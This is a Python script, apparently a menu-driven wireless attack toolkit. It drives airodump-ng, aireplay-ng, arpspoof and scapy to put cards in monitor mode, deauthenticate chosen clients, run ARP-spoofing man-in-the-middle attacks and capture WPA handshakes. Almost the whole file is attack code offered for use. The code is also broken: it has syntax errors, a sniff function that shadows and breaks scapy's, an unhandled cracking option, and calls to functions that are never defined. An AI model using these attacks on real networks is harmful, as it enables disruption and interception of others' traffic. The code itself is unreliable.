import subprocess
from scapy.all import *
import argparse
def captureHandshake(bssid, channel, filename, interface): # capture a four-way handshake
    
    
    command = [
        "sudo",
        "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        "--write", filename,
        interface
    ]

    
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("Error running airodump-ng: ",e)

    
def arpSpoof(interface,target_ip,router_ip): # ARP spoofing


    subprocess.run(["sudo", "netdiscover", "-i", interface])


    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")


    subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, router_ip])
    subprocess.Popen(["arpspoof", "-i", interface, "-t", router_ip, target_ip])

def viewTraffic(interface):
    subprocess.Popen(["wireshark", "-i", interface])
def deauthenticate(deauth_packets, bssid, client_mac, interface): #deauth attack
    try:
        
        command = [
            'sudo',
            'aireplay-ng',
            '--deauth', str(deauth_packets),
            '-a', bssid,
            '-c', client_mac,
            interface
        ]

        
        subprocess.run(command, check=True)
        print("Deauthentication packets sent successfully.")
    except subprocess.CalledProcessError as e:
        print("An error occurred while sending deauth packets:",e)
    except Exception as e:
        print("An unexpected error occurred:",e)
def capture_packets(bssid, channel, interface, filename): # targeted packet capture
    
    
    subprocess.run(['iwconfig', interface, 'channel', str(channel)])
    
    
    print("Capturing packets on",interface,"for BSSID",bssid)
    packets = sniff(
        iface=interface, 
        bpf_filter=f'ether host {bssid}',  
        prn=lambda x: x.summary(),  
        count=0,  
        store=1   
    )
    
    
    wrpcap(filename, packets)
def get_monitor_mode_interface(): # get the name of the interface in monitor mode
    try:
        
        iwconfig_output = subprocess.check_output(['iwconfig'], stderr=subprocess.DEVNULL).decode('utf-8')
        
      
        for line in iwconfig_output.split('\n'):
            
            if " Mode:Monitor" in line:
                
                return line.split()[0]
        
        
        return None
        
    except (subprocess.CalledProcessError, FileNotFoundError):
        
        return None
def sniff(interface): # start sniffing on all frequencies
    try:
        
        command = ['sudo','airodump-ng', interface, '-abg']
        
        
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print("An error occurred while running airodump-ng: ",e)
    except FileNotFoundError:
        print("airodump-ng is not installed or not found in the system path.")
    except Exception as e:
        print("An unexpected error occurred: ",e)
        
def monitor_mode(interface):
    try:
        
        subprocess.run(['sudo','airmon-ng', 'start', interface], check=True)
        print("Successfully started monitor mode on",interface,'\n')
    except subprocess.CalledProcessError as e:
        print("Failed to start monitor mode on ",interface,': ',e)
def wirelessAttack(): # selection of options for wireless attacks
    while True:
        print('''
    1. Put a wireless card in monitor mode
    2. Packet sniffing
    3. Targeted packet sniffing
    4. Deauth attack
    5. ARP spoofing attack
    6. View captured traffic
    7. Capture WPA/WPA2 handshake
    8. Crack WPA/WPA2 with wordlist
    BACK. Back to main menu
    ''')
        WAchoice=input('Select an option: ')
        if WAchoice=='1':
            check_command = ["airmon-ng", "check"]
    
            try:
                
                check_output = subprocess.run(check_command, capture_output=True, text=True, check=True)
                print("Processes that may interfere with airmon-ng:")
                print(check_output.stdout)
        
                
                kill_command = ["airmon-ng", "check", "kill"]
                kill_output = subprocess.run(kill_command, capture_output=True, text=True, check=True)
        
            
                print(kill_output.stdout)
        
            except subprocess.CalledProcessError as e:
                print("An error occurred while executing the command:")
                print(e.stderr)
            monInterface=input('Enter your interface name: ')
            monitor_mode(monInterface)
            monMode=get_monitor_mode_interface()
            print('The new interface name is:',monMode)
        elif WAchoice=='2':
            monMode = get_monitor_mode_interface() # interface name
            sniff(monMode)
        elif WAchoice=='3':
            monMode = get_monitor_mode_interface()
            bssid=input('Enter the BSSID of the network: ')
            channel=input('Enter the channel: ')
            interface=monMode
            filename=input('Enter the name of the file to write results to: ')
            capture_packets(bssid,channel,interface,filename)
        elif WAchoice=='4':
            monMode = get_monitor_mode_interface()
            deauth_packets=input('How many deauth packets would you like to send? ')
            bssid=input('Enter the BSSID of the network: ')
            clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
            interface=monMode
            deauthenticate(deauth_packets,bssid,clientMac,interface)
        elif WAchoice=='5':
            monMode = get_monitor_mode_interface()
            target_ip=input('Enter the target ip: ')
            router_ip=input('Enter the router ip: ')
            arpSpoof(monMode,target_ip,router_ip)
        elif WAchoice=='6':
            monMode = get_monitor_mode_interface()
            changeInterface=input('The default interface is',monMode,', would you like to change it? [y/n]: ')
            if changeInterface='y':
                newInterface=input('Enter the name of the interface whose captured traffic you would like to view: ')
                viewTraffic(newInterface)
            elif changeInterface='n':
                viewTraffic(monMode)
            else:
                print(invalid option)
        elif WAchoice=='7':
            monMode = get_monitor_mode_interface()
            ifDeauth=input('Would you like to deauthenticate a client to speed up the process [y/n]: ')
            if ifDeauth=='y':
                deauth_packets=input('How many deauth packets would you like to send? ')
                bssid=input('Enter the BSSID of the network: ')
                clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
                interface=monMode
                deauthenticate(deauth_packets,bssid,clientMac,interface)
                
            
        
#---------------------------------------
print('''

#######################################
#        Author & Maintainer:         #
#                                     #
#            Shu-Hao Liu              #
#                                     #
#######################################

Tip: Switch to root before running this tool to get a smoother experience

''')

def main():
    print('''

    1. Wireless Attacks
    2. Scanning and Reconnaissance
    3. Social Engineering Attacks
    4. Payload Generator
    5. Password Attacks
    6. Create a wordlist
    ''')

    choice1= input('Select an option: ')

    if choice1=='1':
        wirelessAttack()
    elif choice1=='2':
        recon()
    elif choice1=='3':
        socialEngineering()
    elif choice1=='4':
        payload()
    elif choice1=='5':
        passwdAttacks()
    elif choice1=='6':
        wordlist()
    else:
        print('Invalid option')
#-----------------------------------
main()
